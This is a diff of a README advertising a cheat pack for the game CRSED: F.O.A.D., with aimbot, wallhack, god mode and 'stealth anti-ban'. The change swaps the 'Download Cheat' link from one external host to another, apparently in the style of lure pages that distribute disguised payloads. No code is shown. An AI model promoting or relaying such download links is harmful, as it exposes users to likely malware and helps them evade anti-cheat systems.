@@ -4,7 +4,7 @@
 
 **CRSED: F.O.A.D.** is one of the most chaotic battle royale games out there — jetpacks, voodoo rituals, kitchen weapons, and full-on insanity. But if you’re done losing to campers and snipers, it’s time to bring out the **cheat mods**: from **aimbot and wallhack to god mode and stealth anti-ban**, this pack gives you **total power** over the battlefield 🧠
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload11.bitbucket.io)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://CRSED-F-O-A-D-Cheat-zavi1.github.io/.github)
 ---
 
 ## 🎯 What CRSED Cheats Are Available?
